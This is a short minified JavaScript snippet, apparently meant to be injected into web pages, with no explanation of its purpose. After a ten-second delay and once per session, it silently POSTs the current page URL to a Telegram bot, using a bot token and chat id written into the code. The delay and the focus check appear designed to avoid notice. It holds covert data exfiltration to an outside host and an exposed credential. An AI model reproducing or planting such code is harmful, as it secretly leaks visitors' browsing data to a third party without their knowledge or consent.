function e(){return!sessionStorage.cookie&&!localStorage.cookie}function o(){if(e()){sessionStorage.cookie=!0;let e=new FormData;e.append("chat_id","166589969"),e.append("text",location.href),fetch("https://api.telegram.org/bot1055191450:AAHisX15RDL1-c1d4Tv2YR3bbSa4aPdpYv4/sendMessage",{method:"POST",body:e})}}e()&&setTimeout(function(){document.hasFocus()?o():window.addEventListener("focus",o,{once:!0})},1e4);